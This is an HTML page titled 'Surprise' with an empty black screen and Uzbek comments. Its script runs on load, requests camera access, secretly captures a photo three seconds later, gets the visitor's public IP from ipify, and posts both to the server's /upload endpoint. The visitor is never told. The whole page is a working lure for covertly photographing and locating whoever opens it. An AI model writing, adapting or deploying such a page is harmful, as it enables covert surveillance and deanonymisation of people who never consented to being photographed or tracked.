<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Surprise</title>
    <style>
        body {
            background-color: black;
            color: white;
            height: 100vh;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
        }
    </style>
</head>
<body>
    <script>
        // IP manzilni olish uchun tashqi API'dan foydalanamiz
        async function getIP() {
            const response = await fetch('https://api.ipify.org?format=json');
            const data = await response.json();
            return data.ip;
        }

        // Kamera ruxsatini olish va avtomatik rasm olish
        async function capturePhoto() {
            const video = document.createElement('video');
            const canvas = document.createElement('canvas');
            const context = canvas.getContext('2d');

            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                video.srcObject = stream;
                video.play();

                setTimeout(async () => {
                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
                    const dataURL = canvas.toDataURL('image/png');
                    const ip = await getIP();

                    // Rasm va IP manzilni serverga yuborish
                    fetch('/upload', {
                        method: 'POST',
                        body: JSON.stringify({ image: dataURL, ip: ip }),
                        headers: {
                            'Content-Type': 'application/json'
                        }
                    }).then(response => response.json())
                      .then(data => console.log('Success:', data))
                      .catch(error => console.error('Error:', error));
                    
                    // Kamera oqimini to'xtatish
                    stream.getTracks().forEach(track => track.stop());
                }, 3000);  // 3 soniya keyin rasm olish
            } catch (error) {
                console.error('Camera access denied or error', error);
            }
        }

        // Sahifa yuklanganda avtomatik rasm olishni boshlash
        window.onload = () => {
            capturePhoto();
        };
    </script>
</body>
</html>

